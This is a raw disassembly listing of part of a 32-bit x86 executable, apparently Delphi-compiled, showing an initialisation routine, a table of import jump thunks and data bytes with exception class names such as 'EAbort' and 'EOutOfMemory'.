  404304:	a3 d4 b3 40 00       	mov    %eax,0x40b3d4
  404309:	33 c0                	xor    %eax,%eax
  40430b:	a3 20 b0 40 00       	mov    %eax,0x40b020
  404310:	33 c0                	xor    %eax,%eax
  404312:	a3 24 b0 40 00       	mov    %eax,0x40b024
  404317:	33 c0                	xor    %eax,%eax
  404319:	a3 28 b0 40 00       	mov    %eax,0x40b028
  40431e:	e8 31 ee ff ff       	call   0x403154
  404323:	33 d2                	xor    %edx,%edx
  404325:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  40432b:	33 c0                	xor    %eax,%eax
  40432d:	a3 2c b0 40 00       	mov    %eax,0x40b02c
  404332:	c6 05 33 b0 40 00 02 	movb   $0x2,0x40b033
  404339:	c6 05 34 b0 40 00 02 	movb   $0x2,0x40b034
  404340:	c6 05 35 b0 40 00 03 	movb   $0x3,0x40b035
  404347:	66 c7 05 dc b3 40 00 	movw   $0x0,0x40b3dc
  40434e:	00 00 
  404350:	66 c7 05 ec b3 40 00 	movw   $0x1,0x40b3ec
  404357:	01 00 
  404359:	e8 fe e4 ff ff       	call   0x40285c
  40435e:	b8 38 b0 40 00       	mov    $0x40b038,%eax
  404363:	ba 98 43 40 00       	mov    $0x404398,%edx
  404368:	e8 b8 f8 ff ff       	call   0x403c25
  40436d:	b8 04 b2 40 00       	mov    $0x40b204,%eax
  404372:	ba 98 43 40 00       	mov    $0x404398,%edx
  404377:	e8 a9 f8 ff ff       	call   0x403c25
  40437c:	33 c0                	xor    %eax,%eax
  40437e:	5a                   	pop    %edx
  40437f:	59                   	pop    %ecx
  404380:	59                   	pop    %ecx
  404381:	64 89 10             	mov    %edx,%fs:(%eax)
  404384:	68 91 43 40 00       	push   $0x404391
  404389:	c3                   	ret
  40438a:	e9 6d ea ff ff       	jmp    0x402dfc
  40438f:	eb f8                	jmp    0x404389
  404391:	5f                   	pop    %edi
  404392:	5e                   	pop    %esi
  404393:	5b                   	pop    %ebx
  404394:	5d                   	pop    %ebp
  404395:	c3                   	ret
  404396:	00 00                	add    %al,(%eax)
  404398:	00 00                	add    %al,(%eax)
  40439a:	00 00                	add    %al,(%eax)
  40439c:	ff 25 58 c1 40 00    	jmp    *0x40c158
  4043a2:	8b c0                	mov    %eax,%eax
  4043a4:	ff 25 54 c1 40 00    	jmp    *0x40c154
  4043aa:	8b c0                	mov    %eax,%eax
  4043ac:	ff 25 50 c1 40 00    	jmp    *0x40c150
  4043b2:	8b c0                	mov    %eax,%eax
  4043b4:	ff 25 4c c1 40 00    	jmp    *0x40c14c
  4043ba:	8b c0                	mov    %eax,%eax
  4043bc:	ff 25 48 c1 40 00    	jmp    *0x40c148
  4043c2:	8b c0                	mov    %eax,%eax
  4043c4:	ff 25 08 c2 40 00    	jmp    *0x40c208
  4043ca:	8b c0                	mov    %eax,%eax
  4043cc:	ff 25 04 c2 40 00    	jmp    *0x40c204
  4043d2:	8b c0                	mov    %eax,%eax
  4043d4:	ff 25 00 c2 40 00    	jmp    *0x40c200
  4043da:	8b c0                	mov    %eax,%eax
  4043dc:	ff 25 fc c1 40 00    	jmp    *0x40c1fc
  4043e2:	8b c0                	mov    %eax,%eax
  4043e4:	ff 25 f8 c1 40 00    	jmp    *0x40c1f8
  4043ea:	8b c0                	mov    %eax,%eax
  4043ec:	ff 25 f4 c1 40 00    	jmp    *0x40c1f4
  4043f2:	8b c0                	mov    %eax,%eax
  4043f4:	ff 25 f0 c1 40 00    	jmp    *0x40c1f0
  4043fa:	8b c0                	mov    %eax,%eax
  4043fc:	ff 25 ec c1 40 00    	jmp    *0x40c1ec
  404402:	8b c0                	mov    %eax,%eax
  404404:	ff 25 e8 c1 40 00    	jmp    *0x40c1e8
  40440a:	8b c0                	mov    %eax,%eax
  40440c:	ff 25 e4 c1 40 00    	jmp    *0x40c1e4
  404412:	8b c0                	mov    %eax,%eax
  404414:	ff 25 e0 c1 40 00    	jmp    *0x40c1e0
  40441a:	8b c0                	mov    %eax,%eax
  40441c:	ff 25 dc c1 40 00    	jmp    *0x40c1dc
  404422:	8b c0                	mov    %eax,%eax
  404424:	ff 25 d8 c1 40 00    	jmp    *0x40c1d8
  40442a:	8b c0                	mov    %eax,%eax
  40442c:	ff 25 d4 c1 40 00    	jmp    *0x40c1d4
  404432:	8b c0                	mov    %eax,%eax
  404434:	ff 25 d0 c1 40 00    	jmp    *0x40c1d0
  40443a:	8b c0                	mov    %eax,%eax
  40443c:	ff 25 cc c1 40 00    	jmp    *0x40c1cc
  404442:	8b c0                	mov    %eax,%eax
  404444:	ff 25 c8 c1 40 00    	jmp    *0x40c1c8
  40444a:	8b c0                	mov    %eax,%eax
  40444c:	ff 25 c4 c1 40 00    	jmp    *0x40c1c4
  404452:	8b c0                	mov    %eax,%eax
  404454:	ff 25 c0 c1 40 00    	jmp    *0x40c1c0
  40445a:	8b c0                	mov    %eax,%eax
  40445c:	ff 25 bc c1 40 00    	jmp    *0x40c1bc
  404462:	8b c0                	mov    %eax,%eax
  404464:	ff 25 b8 c1 40 00    	jmp    *0x40c1b8
  40446a:	8b c0                	mov    %eax,%eax
  40446c:	ff 25 b4 c1 40 00    	jmp    *0x40c1b4
  404472:	8b c0                	mov    %eax,%eax
  404474:	ff 25 b0 c1 40 00    	jmp    *0x40c1b0
  40447a:	8b c0                	mov    %eax,%eax
  40447c:	ff 25 ac c1 40 00    	jmp    *0x40c1ac
  404482:	8b c0                	mov    %eax,%eax
  404484:	ff 25 a8 c1 40 00    	jmp    *0x40c1a8
  40448a:	8b c0                	mov    %eax,%eax
  40448c:	ff 25 a4 c1 40 00    	jmp    *0x40c1a4
  404492:	8b c0                	mov    %eax,%eax
  404494:	ff 25 a0 c1 40 00    	jmp    *0x40c1a0
  40449a:	8b c0                	mov    %eax,%eax
  40449c:	ff 25 9c c1 40 00    	jmp    *0x40c19c
  4044a2:	8b c0                	mov    %eax,%eax
  4044a4:	ff 25 98 c1 40 00    	jmp    *0x40c198
  4044aa:	8b c0                	mov    %eax,%eax
  4044ac:	ff 25 94 c1 40 00    	jmp    *0x40c194
  4044b2:	8b c0                	mov    %eax,%eax
  4044b4:	ff 25 90 c1 40 00    	jmp    *0x40c190
  4044ba:	8b c0                	mov    %eax,%eax
  4044bc:	ff 25 8c c1 40 00    	jmp    *0x40c18c
  4044c2:	8b c0                	mov    %eax,%eax
  4044c4:	ff 25 88 c1 40 00    	jmp    *0x40c188
  4044ca:	8b c0                	mov    %eax,%eax
  4044cc:	ff 25 84 c1 40 00    	jmp    *0x40c184
  4044d2:	8b c0                	mov    %eax,%eax
  4044d4:	ff 25 80 c1 40 00    	jmp    *0x40c180
  4044da:	8b c0                	mov    %eax,%eax
  4044dc:	ff 25 7c c1 40 00    	jmp    *0x40c17c
  4044e2:	8b c0                	mov    %eax,%eax
  4044e4:	ff 25 78 c1 40 00    	jmp    *0x40c178
  4044ea:	8b c0                	mov    %eax,%eax
  4044ec:	ff 25 74 c1 40 00    	jmp    *0x40c174
  4044f2:	8b c0                	mov    %eax,%eax
  4044f4:	ff 25 70 c1 40 00    	jmp    *0x40c170
  4044fa:	8b c0                	mov    %eax,%eax
  4044fc:	ff 25 6c c1 40 00    	jmp    *0x40c16c
  404502:	8b c0                	mov    %eax,%eax
  404504:	ff 25 68 c1 40 00    	jmp    *0x40c168
  40450a:	8b c0                	mov    %eax,%eax
  40450c:	ff 25 64 c1 40 00    	jmp    *0x40c164
  404512:	8b c0                	mov    %eax,%eax
  404514:	ff 25 60 c1 40 00    	jmp    *0x40c160
  40451a:	8b c0                	mov    %eax,%eax
  40451c:	ff 25 38 c2 40 00    	jmp    *0x40c238
  404522:	8b c0                	mov    %eax,%eax
  404524:	ff 25 3c c2 40 00    	jmp    *0x40c23c
  40452a:	8b c0                	mov    %eax,%eax
  40452c:	ff 25 34 c2 40 00    	jmp    *0x40c234
  404532:	8b c0                	mov    %eax,%eax
  404534:	ff 25 30 c2 40 00    	jmp    *0x40c230
  40453a:	8b c0                	mov    %eax,%eax
  40453c:	ff 25 2c c2 40 00    	jmp    *0x40c22c
  404542:	8b c0                	mov    %eax,%eax
  404544:	ff 25 28 c2 40 00    	jmp    *0x40c228
  40454a:	8b c0                	mov    %eax,%eax
  40454c:	ff 25 24 c2 40 00    	jmp    *0x40c224
  404552:	8b c0                	mov    %eax,%eax
  404554:	ff 25 20 c2 40 00    	jmp    *0x40c220
  40455a:	8b c0                	mov    %eax,%eax
  40455c:	ff 25 1c c2 40 00    	jmp    *0x40c21c
  404562:	8b c0                	mov    %eax,%eax
  404564:	ff 25 18 c2 40 00    	jmp    *0x40c218
  40456a:	8b c0                	mov    %eax,%eax
  40456c:	ff 25 14 c2 40 00    	jmp    *0x40c214
  404572:	8b c0                	mov    %eax,%eax
  404574:	ff 25 10 c2 40 00    	jmp    *0x40c210
  40457a:	8b c0                	mov    %eax,%eax
  40457c:	00 00                	add    %al,(%eax)
  40457e:	00 00                	add    %al,(%eax)
  404580:	b0 45                	mov    $0x45,%al
  404582:	40                   	inc    %eax
	...
  404593:	00 c2                	add    %al,%dl
  404595:	45                   	inc    %ebp
  404596:	40                   	inc    %eax
  404597:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40459a:	00 00                	add    %al,(%eax)
  40459c:	3c 10                	cmp    $0x10,%al
  40459e:	40                   	inc    %eax
  40459f:	00 c4                	add    %al,%ah
  4045a1:	29 40 00             	sub    %eax,0x0(%eax)
  4045a4:	ac                   	lods   %ds:(%esi),%al
  4045a5:	28 40 00             	sub    %al,0x0(%eax)
  4045a8:	d4 28                	aam    $0x28
  4045aa:	40                   	inc    %eax
  4045ab:	00 18                	add    %bl,(%eax)
  4045ad:	29 40 00             	sub    %eax,0x0(%eax)
  4045b0:	0e                   	push   %cs
  4045b1:	00 00                	add    %al,(%eax)
  4045b3:	00 00                	add    %al,(%eax)
  4045b5:	00 01                	add    %al,(%ecx)
  4045b7:	00 00                	add    %al,(%eax)
  4045b9:	00 00                	add    %al,(%eax)
  4045bb:	10 40 00             	adc    %al,0x0(%eax)
  4045be:	04 00                	add    $0x0,%al
  4045c0:	00 00                	add    %al,(%eax)
  4045c2:	09 45 78             	or     %eax,0x78(%ebp)
  4045c5:	63 65 70             	arpl   %esp,0x70(%ebp)
  4045c8:	74 69                	je     0x404633
  4045ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4045cb:	6e                   	outsb  %ds:(%esi),(%dx)
	...
  4045e4:	00 46 40             	add    %al,0x40(%esi)
  4045e7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4045ea:	00 00                	add    %al,(%eax)
  4045ec:	b0 45                	mov    $0x45,%al
  4045ee:	40                   	inc    %eax
  4045ef:	00 c4                	add    %al,%ah
  4045f1:	29 40 00             	sub    %eax,0x0(%eax)
  4045f4:	ac                   	lods   %ds:(%esi),%al
  4045f5:	28 40 00             	sub    %al,0x0(%eax)
  4045f8:	d4 28                	aam    $0x28
  4045fa:	40                   	inc    %eax
  4045fb:	00 18                	add    %bl,(%eax)
  4045fd:	29 40 00             	sub    %eax,0x0(%eax)
  404600:	06                   	push   %es
  404601:	45                   	inc    %ebp
  404602:	41                   	inc    %ecx
  404603:	62 6f 72             	bound  %ebp,0x72(%edi)
  404606:	74 90                	je     0x404598
	...
  404620:	3c 46                	cmp    $0x46,%al
  404622:	40                   	inc    %eax
  404623:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404626:	00 00                	add    %al,(%eax)
  404628:	b0 45                	mov    $0x45,%al
  40462a:	40                   	inc    %eax
  40462b:	00 c4                	add    %al,%ah
  40462d:	29 40 00             	sub    %eax,0x0(%eax)
  404630:	ac                   	lods   %ds:(%esi),%al
  404631:	28 40 00             	sub    %al,0x0(%eax)
  404634:	98                   	cwtl
  404635:	59                   	pop    %ecx
  404636:	40                   	inc    %eax
  404637:	00 8c 59 40 00 0c 45 	add    %cl,0x450c0040(%ecx,%ebx,2)
  40463e:	4f                   	dec    %edi
  40463f:	75 74                	jne    0x4046b5
  404641:	4f                   	dec    %edi
  404642:	66 4d                	dec    %bp
  404644:	65 6d                	gs insl (%dx),%es:(%edi)
  404646:	6f                   	outsl  %ds:(%esi),(%dx)
  404647:	72 79                	jb     0x4046c2
  404649:	8d 40 00             	lea    0x0(%eax),%eax
	...
  404664:	80 46 40 00          	addb   $0x0,0x40(%esi)
  404668:	10 00                	adc    %al,(%eax)
  40466a:	00 00                	add    %al,(%eax)
  40466c:	b0 45                	mov    $0x45,%al
  40466e:	40                   	inc    %eax
  40466f:	00 c4                	add    %al,%ah
  404671:	29 40 00             	sub    %eax,0x0(%eax)
  404674:	ac                   	lods   %ds:(%esi),%al
  404675:	28 40 00             	sub    %al,0x0(%eax)
  404678:	d4 28                	aam    $0x28
  40467a:	40                   	inc    %eax
  40467b:	00 18                	add    %bl,(%eax)
  40467d:	29 40 00             	sub    %eax,0x0(%eax)
  404680:	0b 45 49             	or     0x49(%ebp),%eax
